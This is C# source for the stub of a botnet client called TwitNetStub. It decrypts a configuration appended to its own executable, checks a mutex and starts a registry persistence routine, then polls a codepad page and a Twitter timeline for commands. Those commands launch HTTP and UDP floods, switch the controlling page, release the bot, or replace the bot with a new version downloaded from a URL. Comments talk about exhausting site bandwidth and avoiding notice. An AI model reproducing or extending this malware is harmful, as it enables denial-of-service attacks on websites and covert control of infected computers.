/*
 * TODO:
 * - Way more operations
 */

using System;
using System.Text;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using System.Text.RegularExpressions;
using TwitNetStub.Operations;
using TwitNetStub.Util.Encryption;
using TwitNetStub.Util.Misc;

namespace TwitNetStub
{
    public sealed class Main
    {
        #region Singleton
        static Main _instance;
        static readonly object PadLock = new object();

        public static Main Instance
        {
            get
            {
                lock (PadLock)
                {
                    return _instance ?? (_instance = new Main());
                }
            }
        }
        #endregion

        public void Start()
        {
            //File.SetAttributes(Constants.FileName, FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed);
            //Grab file contents
            byte[] stub = File.ReadAllBytes(Application.ExecutablePath);

            string appendData = Strings.Split(Encoding.Default.GetString(stub), Constants.Splitter, -1, CompareMethod.Text)[1];
            SimpleAES defaultAES = new SimpleAES(true);
            appendData = defaultAES.Decrypt(Encoding.Default.GetBytes(appendData));
            Constants.CustomEncryptionKey = Strings.Split(appendData, Constants.Splitter, -1, CompareMethod.Text)[1];
            defaultAES.Key = Encoding.Default.GetBytes(Constants.CustomEncryptionKey);
            appendData = defaultAES.Decrypt(
                Encoding.Default.GetBytes(Strings.Split(appendData, Constants.Splitter, -1, CompareMethod.Text)[0]));
            //Above steps:
            //|split|DefaultKeycrypt(CustomKeycrypt(codepad page)|split|customkey)
            //DefaultKeycrypt(CustomKeycrypt(codepad page)|split|customkey)
            //CustomKeycrypt(codepad page)|split|customkey
            //^split off the key, then split it for the crypted page & decrypt
            //codepad page


            //OK LETS CHECK FOR SHIT WE DON'T WANT BEFORE DOWNLOADING ANYTHING AND MAKING OURSELVES MORE NOTICEABLE, K?
            Variables.Mutex = new Mutex(false, Constants.MutexID, out Variables.CreatedMutex);
            Util.AntiCheck.StartRegistry.Start();

            Variables.CodePadURL = appendData;
            new Thread(checkTwitter).Start();
        }

        private void checkTwitter()
        {
            Label_1:
            WebClient client = new WebClient();
            string command;
            string arg;
            string codepad = client.DownloadString("http://" + Variables.CodePadURL + ".codepad.org/");
            string twitUser = Regex.Split(codepad, "<pre>http://twitter.com/")[1].Split('<')[0].Trim();

            string tweet = Twitter.GetTweet(client.DownloadString("http://api.twitter.com/1/statuses/user_timeline/" + twitUser + ".xml"));

            //these will throw a null pointed if you dont do <command> at <argument>
            //even if there are no arguments. ill fix it later...
            try
            {
                command = Strings.Split(tweet, Constants.CommandSplitter)[0];
                arg = Strings.Split(tweet, Constants.CommandSplitter)[1];
            }
            catch (Exception)
            {
                command = "null";
                arg = "null";
            }
            

            if (command == Variables.LastTweet)
                command = "null";//so it goes to default & doesn't loop on the same command

            IBotOperation op = null;
            switch (command.ToLower())
            {
                case "httpflood":
                    //httpflood at URL
                    op = new HTTPFloodOP(arg);
                    break;
                case "udpflood":
                    //udpflood at URL
                    op = new UDPFloodOP(arg);
                    break;
                case "bwrape":
                    //bwrape at URL
                    //mass downloads a file to rape bandwidth on a website
                    //something like a large image.
                    //Arguments: URL
                    break;
                case "switch":
                    //switch at codepad_page
                    op = new SwitchMasterOP(arg);
                    break;
                case "choniboi":
                    //choniboi at <anything>
                    op = new ReleaseBotOP();
                    //Arguments: None
                    break;
                case "visit":
                    //visit at URL
                    //will visit a website once for traffic reasons
                    //Arguments: URL, Maybe an integer for how many visits
                    break;
                case "update":
                    //update at URL
                    op = new UpdateBotOP(arg);
                    //Will make the bot replace itself with a newer version
                    //Arguments: URL
                    break;
                case "thanks":
                    //thanks at <anything>
                    //By leaving this blank, the bot will go see "thanks"
                    //and stop whatever its doing. Any time you start an operation
                    //you will need to end it by saying "thanks"
                    //or else the bots will keep looping their operation every time
                    //it reads the tweet. this reminds me that we need to add some way to
                    //make sure to add some mechanism that checks if it has already completed
                    //an operation if it should only be done once like updating or visiting
                    //Arguments: None
                    break;
                default:
                    //If the command cant be identified, well then shit son.
                    return;
            }
            if (op != null)
            {
                op.Initialize();
                op.Run();
            }

            Variables.LastTweet = tweet;
            Thread.Sleep(300000);
            goto Label_1;
        }
    }
}
